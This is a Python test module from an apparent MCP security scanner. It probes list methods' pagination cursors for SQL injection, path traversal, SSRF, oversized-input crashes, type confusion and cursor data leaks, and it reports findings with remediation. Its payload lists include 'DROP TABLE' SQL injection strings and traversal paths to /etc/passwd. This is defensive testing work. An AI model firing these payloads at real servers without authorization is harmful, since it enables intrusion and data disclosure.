"""
MCP Pagination / Cursor Abuse.

`tools/list`, `resources/list`, `prompts/list`, and `resources/templates/
list` all accept an opaque `cursor` parameter for pagination. Per the
spec it is opaque to the client — but server-side it's almost always:

  - A base64-encoded JSON / SQL offset string ("`{\"offset\":50}`").
  - A signed integer page index.
  - A next-key token containing PII or DB internals.

Servers that don't strictly validate the cursor are vulnerable to:

  - SQL injection (cursor goes into "WHERE id > $cursor" unparameterised)
  - SSRF (cursor decoded as URL)
  - Path traversal (cursor decoded as filename)
  - DoS / oversized cursor crash
  - Information disclosure (cursor leaks DB schema in error messages)

Tests
-----
1. **Baseline** — request page-1 of every list method to get a cursor.
   Decode it (base64, JSON, hex) — disclosure if it contains structure.
2. **Empty cursor** — does the server treat `cursor=""` differently from
   no cursor?
3. **Oversized cursor** — `cursor = "A" * 1MB` — DoS / parser crash.
4. **SQLi cursor** — `cursor = "'; DROP TABLE x--"` and `cursor = "1' OR
   '1'='1"` — error markers.
5. **SSRF cursor** — `cursor = canary_url`. If the OOB callback fires,
   the cursor is being used as a URL fetch.
6. **Path-traversal cursor** — `cursor = "../../../../etc/passwd"`.
7. **Type confusion** — cursor as integer, array, object instead of
   string.

Dynamic params
--------------
  protocol_version, transport_override
  test_methods       — list[ "tools/list","resources/list","prompts/list",
                             "resources/templates/list" ]
  oversized_size_kb  — bytes for oversized cursor
  oob_wait_seconds   — for SSRF probe
"""

import base64 as _b64
import json as _json
import time as _time


_DEFAULT_METHODS = (
    "tools/list",
    "resources/list",
    "prompts/list",
    "resources/templates/list",
)

_SQLI_CURSORS = (
    "'",
    "' OR '1'='1",
    "1; DROP TABLE x--",
    "1) OR (1=1)--",
    "%27",
)

_PATH_CURSORS = (
    "../../../../etc/passwd",
    "..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
    "file:///etc/passwd",
)


def execute(target, params, context):
    rb = evidence.ReportBuilder(
        attack_id=context.get("attack_id", "pagination_cursor_abuse"),
        target=target,
    )
    timeout = int(params.get("timeout", 30))
    protocol_version = params.get("protocol_version") or None
    transport_override = params.get("transport_override") or None
    methods = params.get("test_methods") or list(_DEFAULT_METHODS)
    oversized_size_kb = int(params.get("oversized_size_kb", 256))
    oob_wait_seconds = int(params.get("oob_wait_seconds", 15))

    mcp = mcp_client.MCPClient.from_target(
        target, timeout=timeout,
        protocol_version=protocol_version,
        force_transport=transport_override,
    )
    try:
        init = mcp.initialize()
        if not init.get("ok"):
            rb.error(f"MCP initialize failed: {init.get('error')}")
            return rb.finalize(success=False)

        for method in methods:
            rb.info(f"Probing {method}")

            # 1) Baseline + cursor decode
            r = mcp.transport.send(method, {})
            rb.add_evidence(evidence.ev_mcp_call(r, note=f"{method} baseline"))
            cursor = (r.get("result") or {}).get("nextCursor") if r.get("ok") else None
            if cursor:
                _audit_cursor_disclosure(method, cursor, rb, context)

            # 2) Empty cursor
            r2 = mcp.transport.send(method, {"cursor": ""})
            rb.add_evidence(evidence.ev_mcp_call(r2, note=f"{method} empty cursor"))

            # 3) Oversized cursor
            big = "A" * (oversized_size_kb * 1024)
            t0 = _time.time()
            r3 = mcp.transport.send(method, {"cursor": big})
            dt = _time.time() - t0
            rb.add_evidence(evidence.ev_mcp_call(
                r3, note=f"{method} oversized {oversized_size_kb}KB dt={dt:.2f}"))
            if _is_5xx(r3) or "internal" in str(r3.get("error") or "").lower():
                rb.add_finding(evidence.Finding(
                    attack_id=context.get("attack_id", "pagination_cursor_abuse"),
                    title=f"{method} crashes on oversized cursor ({oversized_size_kb}KB)",
                    category="pagination_cursor_abuse",
                    severity="medium", confidence="confirmed",
                    cwe="CWE-20",
                    payload=f"len(cursor)={oversized_size_kb}KB",
                    description=(
                        "Server returned 5xx / internal error when given a "
                        "{}KB cursor.".format(oversized_size_kb)
                    ),
                    remediation="Cap cursor length at parse time (≤4KB).",
                ))

            # 4) SQLi cursors
            for c in _SQLI_CURSORS:
                r = mcp.transport.send(method, {"cursor": c})
                rb.add_evidence(evidence.ev_mcp_call(
                    r, note=f"{method} SQLi cursor {c!r}"))
                err_txt = _json.dumps(r.get("error") or {}) + \
                          _json.dumps(r.get("response") or {})
                if _sqli_marker(err_txt.lower()):
                    rb.add_finding(evidence.Finding(
                        attack_id=context.get("attack_id", "pagination_cursor_abuse"),
                        title=f"SQL error from {method} cursor",
                        category="pagination_cursor_abuse",
                        severity="critical", confidence="high",
                        cwe="CWE-89",
                        payload=c,
                        description=(
                            "Cursor value triggered a SQL error message in the "
                            "server response. The cursor is being concatenated "
                            "into a query without parameterisation."
                        ),
                        impact="Full SQLi via the pagination surface.",
                        remediation="Parameterise the cursor query. Decode + "
                                    "validate cursors as opaque tokens.",
                        evidence=[evidence.ev_mcp_call(r)],
                    ))
                    break

            # 5) Path-traversal cursors
            for c in _PATH_CURSORS:
                r = mcp.transport.send(method, {"cursor": c})
                rb.add_evidence(evidence.ev_mcp_call(
                    r, note=f"{method} path cursor {c!r}"))
                text = _json.dumps(r.get("response") or {}).lower()
                if "root:x:0:0" in text or "127.0.0.1" in text:
                    rb.add_finding(evidence.Finding(
                        attack_id=context.get("attack_id", "pagination_cursor_abuse"),
                        title=f"Path traversal via {method} cursor",
                        category="pagination_cursor_abuse",
                        severity="critical", confidence="confirmed",
                        cwe="CWE-22",
                        payload=c,
                        description="Cursor decoded as a filename and "
                                    "/etc/passwd or hosts content was returned.",
                        remediation="Treat cursors as opaque tokens.",
                    ))
                    break

            # 6) SSRF cursor (OOB)
            token = oob.mint(attack_id="pagination_cursor_abuse",
                             ttl=oob_wait_seconds + 15,
                             metadata={"method": method})
            r = mcp.transport.send(method, {"cursor": token.url})
            rb.add_evidence(evidence.ev_mcp_call(
                r, note=f"{method} SSRF cursor"))
            hits = oob.wait(token.token, timeout=oob_wait_seconds)
            if hits:
                rb.add_finding(evidence.Finding(
                    attack_id=context.get("attack_id", "pagination_cursor_abuse"),
                    title=f"SSRF via {method} cursor",
                    category="pagination_cursor_abuse",
                    severity="high", confidence="confirmed",
                    cwe="CWE-918",
                    payload=token.url,
                    description=(
                        f"Cursor URL was fetched by the server (callback from "
                        f"{hits[0].get('source_ip')}). The cursor is being used "
                        "as a URL."
                    ),
                    remediation="Treat cursors as opaque IDs.",
                    evidence=[evidence.ev_oob_hit(token.token, hits)],
                ))
            oob.release(token.token)

            # 7) Type-confusion cursor
            for label, value in [("integer", 99999),
                                 ("array", [1, 2]),
                                 ("object", {"offset": 0})]:
                r = mcp.transport.send(method, {"cursor": value})
                rb.add_evidence(evidence.ev_mcp_call(
                    r, note=f"{method} cursor type={label}"))
                if r.get("ok") and not (r.get("error")):
                    rb.add_finding(evidence.Finding(
                        attack_id=context.get("attack_id", "pagination_cursor_abuse"),
                        title=f"{method} accepts non-string cursor ({label})",
                        category="pagination_cursor_abuse",
                        severity="low", confidence="medium",
                        cwe="CWE-704",
                        payload=str(value),
                        description=("Spec says cursor must be a string. Server "
                                     "accepted {}.").format(label),
                        remediation="Reject non-string cursors.",
                    ))
        return rb.finalize()
    finally:
        mcp.close()


def _audit_cursor_disclosure(method, cursor, rb, context):
    """Cursors should be opaque. If we can decode one, that's a finding."""
    decoded = None
    for tag, decoder in (
        ("base64+json", lambda s: _json.loads(_b64.b64decode(s + "===").decode())),
        ("base64",      lambda s: _b64.b64decode(s + "===").decode("utf-8", "replace")),
        ("json",        _json.loads),
        ("hex+json",    lambda s: _json.loads(bytes.fromhex(s).decode())),
    ):
        try:
            decoded = decoder(cursor)
            tag_used = tag
            break
        except Exception:
            decoded = None
    if decoded is None:
        return
    smelly = (
        isinstance(decoded, (dict, list)) or
        (isinstance(decoded, str) and any(k in decoded.lower()
                                          for k in ("offset", "id=", "uuid",
                                                    "select ", "where ",
                                                    "userid", "user_id",
                                                    "internal")))
    )
    if smelly:
        rb.add_finding(evidence.Finding(
            attack_id=context.get("attack_id", "pagination_cursor_abuse"),
            title=f"Cursor from {method} is decodeable / leaks structure",
            category="pagination_cursor_abuse",
            severity="medium", confidence="confirmed",
            cwe="CWE-200",
            payload=f"cursor[:80]={cursor[:80]} decoded_as={tag_used}",
            description=(
                f"Cursor decoded successfully via {tag_used} and revealed "
                f"server-side structure: {str(decoded)[:300]}. Cursors should "
                "be opaque, signed tokens (e.g. encrypted offset + HMAC)."
            ),
            impact=(
                "Attackers can craft cursors with arbitrary internal values "
                "(skip ahead, target other users' rows). Combined with weak "
                "validation this often yields IDOR or DoS."
            ),
            remediation=(
                "Generate cursors via HMAC-signed offsets. Validate signature "
                "before decoding. Reject any cursor not produced by this server."
            ),
        ))


def _is_5xx(r):
    s = r.get("status")
    return s is not None and s >= 500


def _sqli_marker(text: str) -> bool:
    markers = ("syntax", "unterminated", "unexpected token", "ora-",
               "mysql", "postgres", "psql", "sqlite_error",
               "incorrect syntax", "near \"")
    return any(m in text for m in markers)
